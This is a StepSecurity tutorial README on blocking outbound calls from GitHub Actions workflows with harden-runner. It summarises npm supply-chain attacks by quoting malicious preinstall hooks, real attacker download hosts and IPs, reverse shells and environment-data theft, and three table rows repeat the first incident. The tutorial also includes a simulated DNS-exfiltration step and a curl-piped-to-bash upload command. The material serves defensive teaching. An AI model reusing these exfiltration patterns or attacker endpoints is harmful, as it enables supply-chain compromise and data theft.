<p align="left">
  <img src="https://raw.githubusercontent.com/step-security/supply-chain-goat/main/images/Logo.png" alt="Step Security Logo" width="340">
</p>

# Tutorial: Behavioral analysis of dependencies

_Estimated completion time: 4 minutes_

## Summary of past incidents
Over the past years, there have been multiple attacks that can be attributed to compromised npm dependencies. The general theme that the attacks follow is that a widely used npm dependency is hijacked and malicious code is pushed into the dependency that makes malicious outbound calls. This attack affects every system that uses or has been using that particular dependency. Below is a list of such attacks that have taken place.

Number | Incident  | Details
-------|--------- |------------------
1      |[Compromise of NPM packages coa and rc](https://blog.sonatype.com/npm-hijackers-at-it-again-popular-coa-and-rc-open-source-libraries-taken-over-to-spread-malware) | A preinstall step "preinstall": "start /B node compile.js & node compile.js" was added to the updated dependency. The js files launch a batch script. The batch script then makes calls to https://pastorcryptograph.at using curl and wget|
2      |[Compromise of ua-parser-js](https://github.com/faisalman/ua-parser-js/issues/536) | A preinstall step "preinstall": "start /B node preinstall.js & node preinstall.js" was added to the updated dependency. The js files launch a batch script. The preinstall.js then launches OS specific script i.e .bat or .sh, those scripts then uses certutil.exe and wget or curl to download file from: http://159.148.186.228/download/jsextension.exe or https://citationsherbe.at/sdd.dll. Checkout: https://my.diffend.io/npm/ua-parser-js/0.7.28/0.7.29|
3      |[The klow / klown / okhsa incident](https://github.com/cncf/tag-security/blob/main/supply-chain-security/compromises/2021/klow-klown-okhsa.md) | A preinstall step "preinstall": "start /B node preinstall.js & node preinstall.js" was added to the updated dependency. The js files launch a batch script or a shell script acc. to the OS. The batch script then makes a call to http://185.173.36.219/download/jsextension.exe using curl, wget or certutil to download a exe or an elf binary file acc. to the OS. Checkout:https://my.diffend.io/npm/klown/0.7.29|
4      |[NPM reverse shells and data mining](https://github.com/cncf/tag-security/blob/main/supply-chain-security/compromises/2020/nodejs.md) | npm packages (plutov-slack-client, nodetest1010, and nodetest199) execute js script to spawn a child process acc to OS (Windows and Unix-based systems). This Child Process establishes a reverse shell to the attacker's server using “net.connect”. npm package npmpubman execute a js file to collect info about the victim. It collects user data from the environment info provided by NodeJS “process.env”. This data is posted to a remote host(*.net) using “http.request”. Checkout: https://www.bleepingcomputer.com/news/security/npm-nukes-nodejs-malware-opening-windows-linux-reverse-shells/|
5      |[The event-stream vulnerability](https://github.com/cncf/tag-security/blob/main/supply-chain-security/compromises/2018/event_stream.md) | "Dependencies": "flatmap-stream": "0.1.1". The js file looks for the victim hot wallet profiles for a  mobile apps or your regular browser. It maps public keys with walled id and then send it to a server in Kuala Lumpur (hosted here: https://www.shinjiru.com.my/ or https://111.90.151.134) using “http.request”. Checkout: https://medium.com/intrinsic-blog/compromised-npm-package-event-stream-d47d08605502|
1      |[Compromise of NPM packages coa and rc](https://blog.sonatype.com/npm-hijackers-at-it-again-popular-coa-and-rc-open-source-libraries-taken-over-to-spread-malware) | A preinstall step "preinstall": "start /B node compile.js & node compile.js" was added to the updated dependency. The js files launch a batch script. The batch script then makes calls to https://pastorcryptograph.at using curl and wget|
1      |[Compromise of NPM packages coa and rc](https://blog.sonatype.com/npm-hijackers-at-it-again-popular-coa-and-rc-open-source-libraries-taken-over-to-spread-malware) | A preinstall step "preinstall": "start /B node compile.js & node compile.js" was added to the updated dependency. The js files launch a batch script. The batch script then makes calls to https://pastorcryptograph.at using curl and wget|
1      |[Compromise of NPM packages coa and rc](https://blog.sonatype.com/npm-hijackers-at-it-again-popular-coa-and-rc-open-source-libraries-taken-over-to-spread-malware) | A preinstall step "preinstall": "start /B node compile.js & node compile.js" was added to the updated dependency. The js files launch a batch script. The batch script then makes calls to https://pastorcryptograph.at using curl and wget|


## How does StepSecurity mitigate this threat?
StepSecurity [`harden-runner`](https://github.com/step-security/harden-runner) analyzes the outbound calls made by the workflow and recommends the appropriate policy containing the allowed outbound endpoints. Any outbound call not in the list of allowed endpoints is blocked to prevent a potential DNS Exfiltration attack.

## Tutorial
Learn how to prevent DNS exfiltration from a GitHub Actions workflow. 

1. Create a fork of the repo.

2. Go to the `Actions` tab in the fork. Click the `I understand my workflows, go ahead and enable them` button. 
   
   <img src="https://raw.githubusercontent.com/step-security/supply-chain-goat/main/images/EnableActions.png" alt="Enable Actions" width="800">

3. GitHub Action workflow files are in the `.github/workflows` folder of the repo. Browse to the `ci.yml` file. Edit it using the GitHub website, and add the `step-security/harden-runner` GitHub Action as the first step from `line 9` onwards in the `ci.yml` file. Commit the changes either to `main` branch or any other branch.  

    ```yaml
    - uses: step-security/harden-runner@v1
      with:
        egress-policy: audit
    ```
    The updated file should look like this:
    ```yaml
    name: Test and coverage

    on: [push, pull_request, workflow_dispatch]

    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          #Add StepSecurity Harden Runner from here onwards
          - uses: step-security/harden-runner@v1
            with:
              egress-policy: audit
          - uses: actions/checkout@v2
            with:
              fetch-depth: 2
          - uses: actions/setup-go@v2
            with:
              go-version: '1.17'
          - name: Run coverage
            run: go test -race -coverprofile=coverage.txt -covermode=atomic
          - name: Upload coverage to Codecov
            run: |
              bash <(curl -s https://codecov.io/bash)
    ```

4. This change should cause the workflow to run, as it is set to run on push. Click on the `Actions` tab and then click on the `build` tab under the `ci.yml` section to view the workflow run. 

5. You should see a link to security insights and recommendations for the workflow run under the `Run step-security/harden-runner` tab. 

    <img src="https://raw.githubusercontent.com/step-security/supply-chain-goat/main/images/InsightsLink.png" alt="Link to security insights" width="800">


6. Click on the link. You should see outbound traffic correlated with each step of the workflow. An outbound network policy would be recommended. 

7. Update the `ci.yml` workflow with the recommended policy from the link. The first step should now look like this. From now on, outbound traffic will be restricted to only these domains for this workflow. 

    ```yaml
    - uses: step-security/harden-runner@v1
      with:
        allowed-endpoints: 
          codecov.io:443
          github.com:443
    ```
    The updated file should look like this:
    ```yaml
    name: Test and coverage

    on: [push, pull_request, workflow_dispatch]

    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          #Add StepSecurity Harden Runner from here onwards
          - uses: step-security/harden-runner@v1
            with:
              allowed-endpoints: 
                codecov.io:443
                github.com:443
          - uses: actions/checkout@v2
            with:
              fetch-depth: 2
          - uses: actions/setup-go@v2
            with:
              go-version: '1.17'
          - name: Run coverage
            run: go test -race -coverprofile=coverage.txt -covermode=atomic
          - name: Upload coverage to Codecov
            run: |
              bash <(curl -s https://codecov.io/bash)
     ````

8. Simulate a DNS exfiltration attack similar to the one used in the dependency confusion attack. Update the workflow and add the following statement. In the actual attack, the outbound call was made by a malicious package as part of `preinstall` step. In this case, just add this step to the workflow to simulate sending the repo name as a sub-domain to stepsecurity.io. 

    ```yaml
    - name: Simulate DNS traffic
        run: |
          domain="${GITHUB_REPOSITORY}.stepsecurity.io"
          domain=${domain//\//-}
          nslookup "${domain}"
    ```
    The updated file should look like this:
    ```yaml
    name: Test and coverage

    on: [push, pull_request, workflow_dispatch]

    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          #Add StepSecurity Harden Runner from here onwards
          - uses: step-security/harden-runner@v1
            with:
              allowed-endpoints: 
                codecov.io:443
                github.com:443
          - uses: actions/checkout@v2
            with:
              fetch-depth: 2
          - uses: actions/setup-go@v2
            with:
              go-version: '1.17'
          - name: Run coverage
            run: go test -race -coverprofile=coverage.txt -covermode=atomic
          - name: Upload coverage to Codecov
            run: |
              bash <(curl -s https://codecov.io/bash)
          - name: Simulate DNS traffic
            run: |
              domain="${GITHUB_REPOSITORY}.stepsecurity.io"
              domain=${domain//\//-}
              nslookup "${domain}"
      ```

9. This change should cause the workflow to run, as it is set to run on push.

10. Observe that the workflow shows an annotation that the DNS resolution for the call is blocked. If you look at the build logs, you will notice that the bash script did not receive a valid response from the DNS server, and the exfiltration attempt was blocked. 

    <img src="https://raw.githubusercontent.com/step-security/supply-chain-goat/main/images/DNSExfilBlocked.png" alt="Blocked calls are shown in Red" width="800">
